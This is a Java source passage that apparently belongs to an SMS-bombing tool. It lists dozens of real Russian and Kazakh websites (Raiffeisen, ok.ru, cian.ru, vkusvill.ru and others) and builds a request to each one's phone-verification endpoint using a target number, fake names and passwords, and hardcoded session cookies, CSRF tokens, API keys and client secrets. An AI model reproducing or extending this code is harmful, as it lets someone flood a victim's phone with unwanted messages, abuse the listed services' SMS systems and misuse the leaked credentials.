            new JsonService("https://moezdorovie.ru/rpc/?method=auth.GetCode", 7) {
                @Override
                public String buildJson(Phone phone) {
                    try {
                        return new JSONObject()
                                .put("id", 40)
                                .put("jsonrpc", "2.0")
                                .put("method", "auth.GetCode")
                                .put("params", new JSONObject()
                                        .put("mustExist", false)
                                        .put("phone", phone)
                                        .put("sendRealSms", true))
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://m.citystarwear.com/bitrix/templates/bs-base/php/includes/bs-handlers.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "PHPSESSID=HJQDoayuamUP7xYhszkLAv8dYMUlcIET; I_BITRIX2_SM_SALE_UID=53c3cec1a62291f06e2377917aab0e5f; _ga=GA1.2.1401457724.1659889156; _gid=GA1.2.46912916.1659889156; _ym_uid=1659889156136024251; _ym_d=1659889156; _ym_visorc=w; _tt_enable_cookie=1; _ttp=690309d0-ce65-46e4-a1c4-72f66fe716b6; tmr_lvid=61bc4dd54d173b5997545a4a6777ca65; tmr_lvidTS=1659889157089; _ym_isad=2; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; I_BITRIX2_SM_BSPopUpBnr=%7B%2296591%22%3A1659975616%7D; I_BITRIX2_SM_BSCatalogSection=fast; tmr_detect=0%7C1659889259844; cto_bundle=M27XMF80Y0ladXRnZ0czRTh0WkJRTGp5UzVDVkVVRFdUajRqd1dhaiUyQjc4SmFRQ2d1SXRiNmZqM04lMkZlRmVzdnd1c2NHaGxUSjhPcU1MbUx5S3hpTTQwdGs3Tzh5WWJpUmFQTGZaTjlzS1E2dkNUYVFITmUyNzJralRyeVl2UDRrbmJmNUF2aWt2ZzlER0NMWFBqMTQlMkZuWVdreGclM0QlM0Q; tmr_reqNum=11; I_BITRIX2_SM_bsAuthPhone=7%239045950105; I_BITRIX2_SM_bsTimeCode=1659889456");

                    builder.add("hdlr", "bsAuthSendCode");
                    builder.add("key", "DOvBhIav34535434v212SEoVINS");
                    builder.add("phone", phone.getPhone());
                    builder.add("pcode", "+7");
                    builder.add("vphone", "");
                }
            },

            new ParamsService("https://stockmann.ru/ajax/", 7) {
                @Override
                public void buildParams(Phone phone) {
                    request.headers(new Headers.Builder().addUnsafeNonAscii("Cookie", "LM_FUSER=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ2YWx1ZSI6IjYyYmIxOWQ1NjM1OTgzLjY3NzYzNTIyNTZiM2M5OGY4NDUyNGQ1MDQyM2U0ODdlN2YzMzNjIn0.iEvAusQL6IYfNkKJIu30LTd9fJxv_lYFPFOKr569LGeokNZHwwVRJMMNpgR9zHFps_0jBB2U-2RkCUuypC4sbWJXBj0ecUoqJOTYi5MCCoaHcb8ICLTbkbZ3Lboaimy0UxmJCWx1qF_iQf1X7EWdRrJfKFrhQnRfiHWFoH_Yx1qbYY4T45BG7pzDiJ6rvinOzaBoBfUoE1Gb2Oufv8e0g7YTwjz_68CKkmbg6lycop_89Glh189inhqoG5x53lT8x0raFRQcphmF5nQl9bgxGsQ_PRFA1GhCyQxycV9P5-nolWSzpskb5cLVDm-ItpOjPuDgrL7hAIa-y894VJ4PjUUAOR5ZxiSJ7Oeao2mWXDhDNrn_Z-T5l4ZK02KBxBawPkkEH84tMEQGvBvJTMJuw7QbA0uBYLWePjOu8hBSkCzxhMrXsIhQu61BzIUHhJfceRtpcBBAoY71pHajGF7w05YWHXdTqXyEDmm6L3jKjYN3W1DVV10ZbGRlQTCtlDRoIhzmFYsY52BK-AyuTdj55dogFuS6pvv_kJ06yHvtVtvR7j0iI4Vy8pIhr67wNhlMEmQj7k6NHqktrSesDCqr7_nN0YG7g-CpZeQhvmY0E3RwrFLEomROwucb6AogDuDH5qzUoVkZHnGWp_z7PTK8lo8pP6yLywHumvdhGaziNEA; _ym_d=1656429014; _ym_uid=16445953601047771209; BITRIX_SM_CITY_NAME=Москва; BITRIX_SM_CITY_SALE_LOCATION_ID=129; BITRIX_SM_LOCATION_GUID=0c5b2444-70a0-4932-980c-b4dc0d3f02b5; BITRIX_SM_DOMAIN_ID=1; _gcl_au=1.1.1516261243.1659701048; tmr_lvid=4e684fc8bc0675f93bcfcf2e49ec8183; tmr_lvidTS=1644595359021; rrpvid=601653173509637; _ga=GA1.2.2110775532.1659701050; rcuid=6275fcd65368be000135cd22; iap.uid=a9a299db4d6c48c5837ca1b9c658c2d7; flocktory-uuid=d9f6b365-937b-4968-a247-ac7e86f44436-1; _tt_enable_cookie=1; _ttp=886adb30-d23b-4be8-b6f9-3bf28b1f2077; PHPSESSID=s54ieq49uplp5b4lqkq5jb950s; _ym_isad=2; _ym_visorc=b; _gid=GA1.2.2031731511.1659890230; tmr_detect=0|1659890230951; cto_bundle=r5kbc182enhuQmFaMkViaWFTNkw5VGlGJTJCMXpBeWs5Uk5EMnI0UkVuNVUzSEprY0Q2emdvYTB6SUdrWUR0NHJ0MEQ5RFNWd3ExN25xYnBwcVhUWE50MHIzTG9XRmFmUm9SWjJicmdnYWNRQ1RRM2s2Snl0UyUyRngwWWlMQzQ5NDdWU0luaDlvSWoydkhmUW1qYnVjUjEwNHphaUJBJTNEJTNE; tmr_reqNum=35").build());

                    builder.addQueryParameter("controller", "user");
                    builder.addQueryParameter("action", "registerUser");
                    builder.addQueryParameter("surname", getRussianName());
                    builder.addQueryParameter("name", getRussianName());
                    builder.addQueryParameter("phone", format(phone.getPhone(), "+7 (***) *** - ** - **"));
                    builder.addQueryParameter("email", getEmail());
                    builder.addQueryParameter("password", "qwertyuio");
                    builder.addQueryParameter("password_confirm", "qwertyuio");
                }
            },

            new FormService("https://chocofood.kz/gateway/user/v2/code/", 77) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("client_id", "11619734");
                    builder.add("login", phone.toString());
                }
            },

            new JsonService("https://sso.mycar.kz/auth/login/", 77) {
                @Override
                public String buildJson(Phone phone) {
                    try {
                        return new JSONObject()
                                .put("phone_number", "+" + phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new ParamsService("https://arbuz.kz/api/v1/user/verification/phone", 77) {
                @Override
                public void buildParams(Phone phone) {
                    request.header("authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI1MjZjODk1NS0wMzgzLTRiM2QtYTJjNy0wZDQ2N2NlYzVhZWQiLCJpc3MiOiJRaEZTNW5vMmJqQzQ3djVRNEU3N0FBMnh3V1BFdUJ1biIsImlhdCI6MTY1OTg5MTQ3MCwiZXhwIjo0ODEzNDkxNDcwLCJjb25zdW1lciI6eyJpZCI6ImU1YzRlYTA1LWY4ZTgtNDJiZC1iMDJhLWNmMzNlODAyZjA5NiIsIm5hbWUiOiJhcmJ1ei1rei53ZWIuZGVza3RvcCJ9LCJjaWQiOm51bGx9.ebpJLdB-FOfb1IsAVbW-dECSoKwQc5tsnhhYKZ_FeM4");

                    builder.addQueryParameter("phone", phone.toString());
                }
            },

            new JsonService("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms", 7) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Accept", "application/json, text/javascript, */*; q=0.01");
                    request.header("Accept-Encoding", "gzip, deflate, br");
                    request.header("Accept-Language", "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7");
                    request.header("Connection", "keep-alive");
                    request.header("Content-Length", "24");
                    request.header("Content-Type", "application/json");
                    request.header("Cookie", "geo_site=www; geo_region_url=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; mobile=false; device=pc; _ga=GA1.2.823290515.1656377291; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-06-28%2003%3A48%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-06-28%2003%3A48%3A10%7C%7C%7Cep%3Dhttps%3A%2F%2Fraiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; _ym_uid=16563772911015405951; _ym_d=1656377291; __zzat129=MDA0dBA=Fz2+aQ==; geo_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; geo_region_coords=55.755787%2C37.617634; geo_site_region=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%2C%D0%A6%D0%B5%D0%BD%D1%82%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; cfids129=; APPLICATION_CONTEXT_CITY=21; sbjs_udata=vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F102.0.5005.115%20Safari%2F537.36%20OPR%2F88.0.4412.75; _gid=GA1.2.229297435.1657385025; _ym_isad=1; _ym_visorc=b; geo_detect_coords=55.796539%2C49.1082; geo_detect_url=kazan; geo_detect=%D0%9A%D0%B0%D0%B7%D0%B0%D0%BD%D1%8C%2C%D0%A0%D0%B5%D1%81%D0%BF%D1%83%D0%B1%D0%BB%D0%B8%D0%BA%D0%B0%20%D0%A2%D0%B0%D1%82%D0%B0%D1%80%D1%81%D1%82%D0%B0%D0%BD%2C%D0%9F%D1%80%D0%B8%D0%B2%D0%BE%D0%BB%D0%B6%D1%81%D0%BA%D0%B8%D0%B9%20%D1%84%D0%B5%D0%B4%D0%B5%D1%80%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D0%B9%20%D0%BE%D0%BA%D1%80%D1%83%D0%B3; _gat=1; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2Fretail%2Fcards%2Fdebit%2Fcashback-card%2F%23ccform-form");
                    request.header("DNT", "1");
                    request.header("Host", "oapi.raiffeisen.ru");
                    request.header("Origin", "https://www.raiffeisen.ru");
                    request.header("Referer", "https://www.raiffeisen.ru/retail/cards/debit/cashback-card/");
                    request.header("Sec-Fetch-Dest", "empty");
                    request.header("Sec-Fetch-Mode", "cors");
                    request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                    request.header("sec-ch-ua-mobile", "?0");
                    request.header("sec-ch-ua-platform", "\"Windows\"");
                    request.header("Sec-Fetch-Site", "same-site");

                    try {
                        return new JSONObject()
                                .put("number", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone") {
                @Override
                public void buildBody(Phone phone) {
                    request.header("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
                    request.header("accept-encoding", "gzip, deflate, br");
                    request.header("accept-language", "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7");
                    request.header("cache-control", "max-age=0");
                    request.header("content-length", "25");
                    request.header("content-type", "application/x-www-form-urlencoded");
                    request.header("cookie", "JSESSIONID=a42d2ee7b58c347d1c614a1a013544a17651b0a68c29bd2f.9bedfb08; bci=1871035486256896851; _statid=5ea6268e-ddfb-4699-974c-d09fd19bb66a; landref=yandex.ru; viewport=1032; _ym_uid=1658092644731300424; _ym_d=1658092644; _ym_isad=1; mtrc=%7B%22mytrackerid%22%3A53328%7D");
                    request.header("dnt", "1");
                    request.header("origin", "https://ok.ru");
                    request.header("referer", "https://ok.ru/dk?st.cmd=anonymRegistrationEnterPhone");
                    request.header("sec-fetch-dest", "document");
                    request.header("sec-fetch-mode", "navigate");
                    request.header("sec-fetch-site", "same-origin");
                    request.header("sec-fetch-user", "?1");
                    request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                    request.header("sec-ch-ua-mobile", "?0");
                    request.header("sec-ch-ua-platform", "\"Windows\"");
                    request.header("upgrade-insecure-requests", "1");

                    builder.add("st.r.phone", "+" + phone.toString());
                }
            },

            new JsonService("https://ud-api.cian.ru/sms/v2/send-validation-code/", 7) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("accept", "*/*");
                    request.header("accept-encoding", "gzip, deflate, br");
                    request.header("accept-language", "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7");
                    request.header("content-length", "50");
                    request.header("content-type", "application/json");
                    request.header("cookie", "cf_clearance=pUtn2Uhr8jZdtAgsnZpYoNMETwur_MgjVR5XAI_hxuk-1656377505-0-150; _CIAN_GK=21a640c3-5527-4144-9257-13f54f73cf06; session_region_id=1; adb=1; login_mro_popup=1; sopr_utm=%7B%22utm_source%22%3A+%22direct%22%2C+%22utm_medium%22%3A+%22None%22%7D; __cf_bm=EGOlfqwI74sY05RNNtRJ41UXSjo7iz_mwq26osjK_I4-1657385366-0-AX0+cpmNhrd8kjYCDL3fJfDcWsmaONkTlro/xo6fIgrm2MJUi3gHI/lrechBtSe6NH8qoD0QUFWTj1GCZ4iA+Nw=; sopr_session=dfbcc56b7faf4662");
                    request.header("dnt", "1");
                    request.header("origin", "https://www.cian.ru");
                    request.header("referer", "https://www.cian.ru/");
                    request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                    request.header("sec-ch-ua-mobile", "?0");
                    request.header("sec-ch-ua-platform", "\"Windows\"");
                    request.header("sec-fetch-dest", "empty");
                    request.header("sec-fetch-mode", "cors");
                    request.header("sec-fetch-site", "same-site");

                    try {
                        return new JSONObject()
                                .put("phone", "+" + phone.toString())
                                .put("type", "authenticateCode")
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://madyart.ru/local/aut.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("accept", "application/json, text/javascript, */*; q=0.01");
                    request.header("accept-encoding", "gzip, deflate, br");
                    request.header("accept-language", "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7");
                    request.header("content-length", "219");
                    request.header("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
                    request.header("cookie", "city=%D0%A3%D1%84%D0%B0; city_auto=%D0%A3%D1%84%D0%B0; PHPSESSID=4MjylRdnF2wecKdI9mZ644mmZBQPsJTr; BITRIX_SM_GUEST_ID=1119274; BITRIX_SM_LAST_ADV=7_Y; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A10%2C%22EXPIRE%22%3A1657227540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1657153957133624831; _ym_d=1657153957; _ym_isad=1; _ym_visorc=w; city_checked=true; BITRIX_SM_LAST_VISIT=07.07.2022+03%3A36%3A40");
                    request.header("dnt", "1");
                    request.header("origin", "https://madyart.ru");
                    request.header("referer", "https://madyart.ru/reg/");
                    request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                    request.header("sec-ch-ua-mobile", "?0");
                    request.header("sec-ch-ua-platform", "\"Windows\"");
                    request.header("sec-fetch-dest", "empty");
                    request.header("sec-fetch-mode", "cors");
                    request.header("sec-fetch-site", "same-origin");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.add("wct_reg_fio", getRussianName());
                    builder.add("wct_reg_fio2", getRussianName());
                    builder.add("wct_reg_phone", format(phone.getPhone(), "+7 (***) *** - ** - **"));
                    builder.add("wct_reg_ch", "Y");
                    builder.add("wct_reg_1", "");
                    builder.add("wct_reg_2", "");
                    builder.add("wct_reg_3", "1");
                    builder.add("wc_phone_psw", "Google123");
                    builder.add("wc_phone_psw2", "Google123");
                }
            },

            new FormService("https://orby.ru/local/ajax/auth/phone.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("accept", "*/*");
                    request.header("accept-encoding", "gzip, deflate, br");
                    request.header("accept-language", "en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7");
                    request.header("content-length", "63");
                    request.header("content-type", "application/x-www-form-urlencoded; charset=UTF-8");
                    request.header("cookie", "PHPSESSID=l5aBRN7PGJgASxApu4Xlw5gDPQW9rpXq; BITRIX_OR_cookieLocationNew=a%3A5%3A%7Bs%3A8%3A%22LOCATION%22%3Bs%3A10%3A%220000103664%22%3Bs%3A4%3A%22CITY%22%3Bs%3A29%3A%22%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3%22%3Bs%3A11%3A%22REGION_NAME%22%3Bs%3A41%3A%22%D0%9B%D0%B5%D0%BD%D0%B8%D0%BD%D0%B3%D1%80%D0%B0%D0%B4%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%D0%B0%D1%81%D1%82%D1%8C%22%3Bs%3A10%3A%22PRICE_TYPE%22%3Ba%3A2%3A%7Bs%3A4%3A%22CODE%22%3Bs%3A52%3A%22%D0%A4%D0%B8%D1%80%D0%BC%D0%B5%D0%BD%D0%BD%D0%B0%D1%8F%20%D1%80%D0%BE%D0%B7%D0%BD%D0%B8%D1%86%D0%B0%20%D0%B0%D0%BA%D1%86%D0%B8%D0%BE%D0%BD%D0%BD%D0%B0%D1%8F%22%3Bs%3A2%3A%22ID%22%3Bi%3A10%3B%7Ds%3A12%3A%22FEDERAL_NAME%22%3BN%3B%7D; PAID_SOURCE_LABEL=na; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A20%2C%22EXPIRE%22%3A1657227540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _ym_uid=1657153918121826480; _ym_d=1657153918; _ym_visorc=w; _ym_isad=1; G_ENABLED_IDPS=google");
                    request.header("dnt", "1");
                    request.header("origin", "https://orby.ru");
                    request.header("referer", "https://orby.ru/");
                    request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                    request.header("sec-ch-ua-mobile", "?0");
                    request.header("sec-ch-ua-platform", "\"Windows\"");
                    request.header("sec-fetch-dest", "empty");
                    request.header("sec-fetch-mode", "cors");
                    request.header("sec-fetch-site", "same-origin");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.add("phone", format(phone.getPhone(), "7 (***) *** ** **"));
                    builder.add("sessid", "408d7573119828883c19f6d2e908684b");
                }
            },

            new FormService("https://planetazdorovo.ru/ajax/vigroup-p_a.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    builder.add("sessid", "761b92cdee8c9ec6bc38801fa55adbbc");
                    builder.add("phone", format(phone.getPhone(), "+7 (***) ***-****"));
                    builder.add("Login", "");

                    request.header("Cookie", "qrator_jsr=1661187308.183.OKTj42c7gC4Rn2u5-vhd2nk9iej7n3j6krb7f8j272vb5lsd0-00; qrator_ssid=1661187309.159.Iddf23puXaQ5PdTc-bgh1om8a5msncmf7fmccfsav11f7iqig; qrator_jsid=1661187308.183.OKTj42c7gC4Rn2u5-r1inosp3apnepd5a05ql5kqre8oadlf0; city_id=749807; city_xml=363; city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%20%D0%B8%20%D0%9C%D0%9E; city_code=moskva-i-mo; help_phone=8%20%28495%29%20369-33-00; order_phone=8%20%28495%29%20145-99-33; region=12; timezone=10800; show_bonus=1; region_id=16; PHPSESSID=vQhek54WUQZnZIcRkOYpKwSYj2AjkWKX; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1661194740%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _gcl_au=1.1.417875050.1661187312; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; _ga=GA1.2.555867500.1661187312; _gid=GA1.2.627621902.1661187312; _dc_gtm_UA-126829878-1=1; tmr_lvid=f20e6d758cfa83ebe50bff36e0e4adaa; tmr_lvidTS=1661187312248; _ym_uid=1661187313781808485; _ym_d=1661187313; _ym_isad=2; _ym_visorc=b; tmr_detect=0%7C1661187314880; tmr_reqNum=3; _gali=phorm_auth_phone");
                    request.header("X-Requested-With", "XMLHttpRequest");
                }
            },

            new JsonService("https://auth.deliveryguru.ru/api/v1/authorization_requests/new") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("x-api-key", "x0EzVouy%-@Mv~EwAWp#V-?HlK2SVp{");
                    request.header("x-app-build", "3");
                    request.header("x-app-version", "1.1.0");
                    request.header("x-platform", "browser");
                    request.header("x-region-id", "34");
                    request.header("x-user-uuid", "be9e157b-02c6-43bf-9c40-cefc5f033776");

                    try {
                        return new JSONObject()
                                .put("client_id", "c9e64381-448c-ad0f-5c1b-6d75998afcd1")
                                .put("client_secret", "790b6b8c7eb1e0fcec7b81627f3f395c")
                                .put("phone", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new JsonService("https://1603.smartomato.ru/account/session", 7) {
                @Override
                public String buildJson(Phone phone) {
                    request.header("x-smartomato-full-basket-payload", "true");
                    request.header("x-smartomato-organization-id", "1603");
                    request.header("x-smartomato-request-tag", "52bb31#1");
                    request.header("x-smartomato-session-id", "d365dc13471538b2b8af56c73fca3324");

                    try {
                        return new JSONObject()
                                .put("g-recaptcha-response", JSONObject.NULL)
                                .put("phone", format(phone.getPhone(), "+7 (***) ***-**-**"))
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new ParamsService("https://knopkadengi.ru/api/registration/send/code", "POST") {
                @Override
                public void buildParams(Phone phone) {
                    request.header("Cookie", "_ym_uid=16612477371039330916; _ym_d=1661247737; _ym_isad=2; _ym_visorc=w; CLIENTSESSION=0ce9e7c0-faa0-9272-b9c0-464622a28c30; JSESSIONID=A54DBB68F538036F565B9B2BFF3F7EFA; __gads=ID=0574b6c6f5a47234-229cde1d00ce0026:T=1661247754:RT=1661247754:S=ALNI_MY3TWfvGJaRIgGYpNsqtq31ZpMGCQ; __gpi=UID=00000aefe4956c38:T=1661247754:RT=1661247754:S=ALNI_Mafm8v4ZxoFvIUKMeo8iqyV0Vmv4A; clientaction_cache=0ce9e7c0-faa0-9272-b9c0-464622a28c30; clientaction_png=0ce9e7c0-faa0-9272-b9c0-464622a28c30; clientaction_etag=0ce9e7c0-faa0-9272-b9c0-464622a28c30");
                    request.header("sec-ch-ua", "\"Chromium\";v=\"102\", \"Opera GX\";v=\"88\", \";Not A Brand\";v=\"99\"");
                    request.header("sec-ch-ua-mobile", "?0");
                    request.header("sec-ch-ua-platform", "\"Windows\"");
                    request.header("sec-fetch-dest", "empty");
                    request.header("sec-fetch-mode", "cors");
                    request.header("sec-fetch-site", "same-origin");
                    request.header("Referer", "https://knopkadengi.ru/registration/step1");

                    builder.addQueryParameter("mobilePhone", phone.getPhone());
                }
            },

            new JsonService("https://app.medtochka.ru/api/profile/confirmation/request/") {
                @Override
                public String buildJson(Phone phone) {
                    request.header("Cookie", "_ym_uid=1661248066781889985; _ym_d=1661248066; _ga=GA1.1.1815553989.1661248066; _ym_isad=2; _ym_visorc=w; _ga_PYGEM3FXRQ=GS1.1.1661248066.1.1.1661248077.0.0.0; csrftoken=i59LXZAWiVA9W5X0cahKzXrLQ13ilVm1QkvghhpGZFv93rdamXHzjc1QmgmBlsOj");
                    request.header("x-csrftoken", "i59LXZAWiVA9W5X0cahKzXrLQ13ilVm1QkvghhpGZFv93rdamXHzjc1QmgmBlsOj");

                    try {
                        return new JSONObject()
                                .put("phone", phone.toString())
                                .toString();
                    } catch (JSONException e) {
                        return null;
                    }
                }
            },

            new FormService("https://vkusvill.ru/ajax/user_v2/auth/check_phone.php", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "PHPSESSID=JFDE2S1WINIRUlqa6WMH4wIGsbN4V6ui; BITRIX_SM_REGION_ID_3=3872; SERVERID=bitrix01; _vv_card=A402373; _gcl_au=1.1.1619096383.1661248403; _ym_uid=1661248404718516519; _ym_d=1661248404; tmr_lvid=4b0376f50a09ccffe9ca93755ced8567; tmr_lvidTS=1661248403869; _ga=GA1.2.395200366.1661248404; _gid=GA1.2.1193627669.1661248404; _gat_gtag_UA_138047372_1=1; _ym_isad=2; mgo_sb_migrations=1418474375998%253D1; mgo_sb_current=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_first=typ%253Dorganic%257C%252A%257Csrc%253Dgoogle%257C%252A%257Cmdm%253Dorganic%257C%252A%257Ccmp%253D%2528none%2529%257C%252A%257Ccnt%253D%2528none%2529%257C%252A%257Ctrm%253D%2528none%2529%257C%252A%257Cmango%253D%2528none%2529; mgo_sb_session=pgs%253D2%257C%252A%257Ccpg%253Dhttps%253A%252F%252Fvkusvill.ru%252F; mgo_uid=FHHjvoNFQne7JHtHv2Uo; mgo_cnt=1; mgo_sid=pk4lrh2bh011001q8wnp; _dc_gtm_UA-138047372-1=1; uxs_uid=6d9a40f0-22c9-11ed-a82b-25c841ac1c5b; BX_USER_ID=d7f672cdeaafc9313a532a213faa66f4; tmr_detect=0%7C1661248406244; WE_USE_COOKIE=Y; tmr_reqNum=8");
                    request.header("x-requested-with", "XMLHttpRequest");

                    builder.add("FUSER_ID", "207529943");
                    builder.add("USER_NAME", "");
                    builder.add("USER_PHONE", format(phone.getPhone(), "+7 (***) ***-****"));
                    builder.add("token", "");
                    builder.add("is_retry", "");
                    builder.add("AGREE_SUBSCRIBE", "Y");
                }
            },

            new FormService("http://mrroll.ru/user/signin", 7) {
                @Override
                public void buildBody(Phone phone) {
                    request.header("Cookie", "PHPSESSID=6a3c30f1f83147bdb07ec4dab8e9f7ac; _csrf=5e0e1518b8ce5a27921ed923860b7e259e50cbc584cf4855bc765312b34ef61ba%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%220ONROmZvhM8Xut0-FdSdRSYoLt1OHKZW%22%3B%7D; _fbp=fb.1.1661248665305.699029426; _ga=GA1.2.1107717800.1661248666; _gid=GA1.2.2137931169.1661248666; _gat_gtag_UA_152986641_2=1; _gat_gtag_UA_152986641_1=1; _ym_uid=1656505428704518293; _ym_d=1661248666; _ym_visorc=w; _ym_isad=2; _tt_enable_cookie=1; _ttp=68b0661d-18ac-4530-a240-ff2c5e219e84; id_city=fe9019692ac92b8570032e2a0069b475041d54256e3d7d5a4de7a25acd096086a%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22id_city%22%3Bi%3A1%3Bi%3A1%3B%7D; id_cart=edec19223e33774d36a181ccad6e2226f3599fb751fb0831f449495e1ebff2bfa%3A2%3A%7Bi%3A0%3Bs%3A7%3A%22id_cart%22%3Bi%3A1%3Bi%3A735413%3B%7D");
                    request.header("X-CSRF-Token", "xsuN5OL-sUIv0g64MasMSbVxCCe7J0n67bvexvV1Z-T2hMO2rZPrNEefNuBE3zxk8xVbQ-l0EJWhz--JvT49sw==");
                    request.header("X-Requested-With", "XMLHttpRequest");

                    builder.add("_csrf", "hX0BMbNIaZL_85OCtVbQNTeuodI5lN6gYkGjxUslBBe1Mk9j_CUz5Je-q9rAIuAYccrytmvHh88uNZKKA25eQA==");
                    builder.add("User[phone]", format(phone.getPhone(), "(***)***-**-**"));
                    builder.add("step", "send-sms");
                }
            },

            new JsonService("https://ud-api.cian.ru/validation-codes/v1/send-code/") {
                @Override
                public String buildJson(Phone phone) {
